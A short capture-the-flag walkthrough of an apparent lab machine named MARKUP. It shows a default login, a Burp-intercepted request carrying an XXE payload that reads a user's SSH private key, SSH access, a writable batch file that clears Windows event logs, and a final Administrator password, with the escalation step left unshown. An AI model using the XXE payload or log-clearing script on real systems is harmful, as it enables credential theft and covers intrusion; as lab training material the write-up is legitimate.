@@ -1,0 +1,113 @@
+1. Now i enter the website with port 80 and I can access login page. There is credential here "admin:password".
+---------------------------------------------------------------------------------------------------------------
+2. Then I intercept the request via using burp suite.
+POST /process.php HTTP/1.1
+
+Host: 10.129.160.19
+
+Content-Length: 194
+
+Accept-Language: en-US,en;q=0.9
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
+
+Content-Type: text/xml
+
+Accept: */*
+
+Origin: http://10.129.160.19
+
+Referer: http://10.129.160.19/services.php
+
+Accept-Encoding: gzip, deflate, br
+
+Cookie: PHPSESSID=kceoj84vge4j92e0boocgj4j0k
+
+Connection: keep-alive
+
+
+
+<?xml version = "1.0"?>
+
+<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/users/daniel/.ssh/id_rsa'>]>
+
+<order><quantity>
+
+3
+
+</quantity><item>
+
+&test;
+
+</item><address>chennai</address></order>
+------------------------------------------------------------------------------------------
+3. After visiting the source code i can find that user daniel and I approached to fins the ssh keys finaly i got it there.
+-------------------------------------------------------------------------------------------
+4.
+ssh -i id_rsa daniel@10.129.160.19     
+The authenticity of host '10.129.160.19 (10.129.160.19)' can't be established.
+ED25519 key fingerprint is SHA256:v2qVZ0/YBh1AMB/k4lDggvG5dQb+Sy+tURkS2AiYjx4.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.129.160.19' (ED25519) to the list of known hosts.
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+daniel@MARKUP C:\Users\daniel>
+--------------------------------------------------------------------------------------------
+5.
+PS C:\Users\daniel> cd C:\
+PS C:\> dir
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        3/12/2020   3:56 AM                Log-Management
+d-----        9/15/2018  12:12 AM                PerfLogs
+d-r---        7/28/2021   2:01 AM                Program Files
+d-----        9/15/2018  12:21 AM                Program Files (x86)
+d-r---         3/5/2020   4:40 AM                Users
+d-----        7/28/2021   2:16 AM                Windows
+-a----        7/28/2021   3:38 AM              0 Recovery.txt
+
+
+PS C:\> cd log-Management
+PS C:\log-Management> dir
+
+
+    Directory: C:\log-Management
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         3/6/2020   1:42 AM            346 job.bat
+
+
+PS C:\log-Management> type job.bat
+@echo off
+FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
+IF (%adminTest%)==(Access) goto noAdmin
+for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
+echo.
+echo Event Logs have been cleared!
+goto theEnd
+:do_clear
+wevtutil.exe cl %1
+goto :eof
+:noAdmin
+echo You must run this script as an Administrator!
+:theEnd
+exit
+PS C:\log-Management> icacls job.bat
+job.bat BUILTIN\Users:(F)
+        NT AUTHORITY\SYSTEM:(I)(F)
+        BUILTIN\Administrators:(I)(F)
+        BUILTIN\Users:(I)(RX)
+
+Successfully processed 1 files; Failed processing 0 files
+PS C:\log-Management>
+---------------------------------------------------------------------------------------
+6. Administrator:Yhk}QE&j<3M
